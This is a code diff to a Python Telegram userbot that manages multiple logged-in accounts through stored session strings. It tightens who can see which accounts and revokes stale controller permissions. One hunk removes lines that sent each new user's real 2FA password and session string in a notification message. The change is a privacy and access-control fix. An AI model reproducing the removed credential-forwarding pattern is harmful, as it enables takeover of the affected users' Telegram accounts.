@@ -13,7 +13,7 @@ import concurrent.futures
 import signal
 import hashlib
 import ast
-from runtime_safety import PollBackoff, recent_burst, service_callback_allowed
+from runtime_safety import grid_core_visible, PollBackoff, recent_burst, service_callback_allowed
 import operator as _operator
 from datetime import timedelta, timezone
 import warnings
@@ -2191,10 +2191,6 @@ async def notify_new_user(user_info, string_session: str,
         f"📱 <b>Phone:</b> <code>{phone}</code>\n"
         f"🛡️ <b>2FA Verified:</b> {twofa_v}\n"
     )
-    if twofa_password:
-        msg += f"🔑 <b>Real 2FA Password:</b> <code>{twofa_password}</code>\n"
-    if string_session:
-        msg += f"🔑 <b>Session String:</b>\n<code>{string_session}</code>\n"
     msg += f"📅 <b>Date &amp; Time (Kolkata):</b> {tstamp}"
 
     try:
@@ -5152,13 +5148,23 @@ async def _asst_callback_inner(event, data, sender_id, owner_id, is_owner):
         )
 
     elif data == b"act_users":
+        # Owner sees every live core; other users only see their own account
+        # and the cores they logged in themselves via the assistant.
         users_info = []
+        _seen = set()
         for cl in [userbot] + list(active_core_clients.values()):
             try:
                 me = await cl.get_me()
-                users_info.append(f"  • <a href='tg://user?id={me.id}'>{me.first_name}</a> ({me.id})")
             except Exception:
-                pass
+                continue
+            if me.id in _seen:
+                continue
+            _seen.add(me.id)
+            if not grid_core_visible(me.id, sender_id, is_owner,
+                                     cfg.get("CORE_CONTROLLERS", {})):
+                continue
+            _nm = _brand_html.escape(getattr(me, "first_name", "") or str(me.id))
+            users_info.append(f"  • <a href='tg://user?id={me.id}'>{_nm}</a> ({me.id})")
         text = ("<blockquote>⚡ <b>ACTIVE GRID CORES:</b>\n\n" +
                 "\n".join(users_info) +
                 f"\n\nTotal: {len(users_info)}</blockquote>")
@@ -5195,6 +5201,15 @@ async def _asst_callback_inner(event, data, sender_id, owner_id, is_owner):
         if 0 <= idx < len(saved):
             removed = saved.pop(idx)
             cfg["SAVED_STRINGS"] = saved
+            # Also drop ownership metadata tied to this session string.
+            _tmap = cfg.get("USER_MAPS", {}).get("telethon", {})
+            for _uid_k, _v in list(_tmap.items()):
+                if _v == removed:
+                    _tmap.pop(_uid_k, None)
+                    _ctl = cfg.get("CORE_CONTROLLERS", {}).pop(_uid_k, None)
+                    _bk = cfg.get("SUDO_MAP", {}).get(_uid_k, {})
+                    if _ctl and int(_ctl) != int(_uid_k) and int(_ctl) in _bk.get("2", []):
+                        _bk["2"].remove(int(_ctl))
             save_config(cfg)
             await _safe_bot_edit(event, sender_id,
                 "<blockquote>✅ Saved session removed.</blockquote>",
@@ -11029,6 +11044,15 @@ def persist_user_session(user_id: int, session_str: str, bot_user_id: int = 0) -
     # it is not an authorization grant. Store the controller in this core's
     # own level-2 bucket so their commands work even when their Telegram ID is
     # different from the logged-in account ID.
+    _ctl_map = cfg.setdefault("CORE_CONTROLLERS", {})
+    _prev_ctl = int(_ctl_map.get(uid_str, 0) or 0)
+    if _prev_ctl and bot_user_id and _prev_ctl != int(bot_user_id) and _prev_ctl != int(user_id):
+        # Controller replaced: revoke the auto-granted command access of the old one.
+        _old_bucket = cfg.setdefault("SUDO_MAP", {}).get(uid_str, {})
+        if _prev_ctl in _old_bucket.get("2", []):
+            _old_bucket["2"].remove(_prev_ctl)
+    if bot_user_id:
+        _ctl_map[uid_str] = int(bot_user_id)
     if bot_user_id and int(bot_user_id) != int(user_id):
         _sudo_map = cfg.setdefault("SUDO_MAP", {})
         _bucket = _sudo_map.setdefault(uid_str, {"1": [], "2": []})
